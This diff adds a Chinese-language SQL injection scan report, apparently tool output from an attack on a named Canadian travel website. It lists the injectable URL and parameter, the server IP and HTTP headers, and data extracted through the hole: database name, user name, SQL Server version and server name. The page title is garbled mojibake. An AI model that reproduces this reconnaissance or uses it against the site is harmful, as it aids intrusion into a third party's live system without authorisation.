@@ -1,0 +1,41 @@
+■漏洞信息:============================================================
+ ·URL:http://www.sea2skytravel.ca/ProductDetailView.asp?section=section_canadatrip&uid=104
+ ·页面标题：柯穿府 咯青荤 - 傈巩啊客 窃膊 祈救茄 咯青阑 汲拌 窍技夸.
+ ·参数:section=section_canadatrip&uid=104
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:216.94.0.9
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/5.0
+Date: Sun, 03 Apr 2011 16:38:09 GMT
+X-Powered-By: ASP.NET
+Connection: Keep-Alive
+Content-Length: 20083
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDQQDQCRDB=JBLPALDAAPCDAGCMJCBNNFNE; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：sea2skytravel
+- 用户名：sea2skytravel
+- 版本：Microsoft SQL Server  7.00 - 7.00.1152 (Intel X86) 
+	Apr 17 2008 13:33:28 
+	Copyright (c) 1988-2002 Microsoft Corporation
+	Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+
+- 服务器名：DB
+- 服务名：MSSQLServer
+- 系统用户名：sea2skytravel
+
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
